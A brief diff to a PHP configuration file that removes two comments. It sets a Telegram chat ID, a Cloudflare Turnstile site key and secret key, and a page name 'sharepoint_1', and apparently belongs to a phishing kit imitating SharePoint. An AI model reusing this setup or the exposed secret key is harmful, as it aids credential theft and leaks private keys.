@@ -9,10 +9,7 @@ $telegram_chat_id = "6040470374";
 
 $cloudflare_enabled = true;
 
-// Cloudflare Turnstile public site key
 $cloudflare_site_key = "0x4AAAAAAF5mxvFLUiYFV4Pb";
-
-// Keep this secret private
 $cloudflare_secret_key = "0x4AAAAAAF5mxnD0ej0BujFHV1Piq8sHiPU";
 
 $page_name = "sharepoint_1";
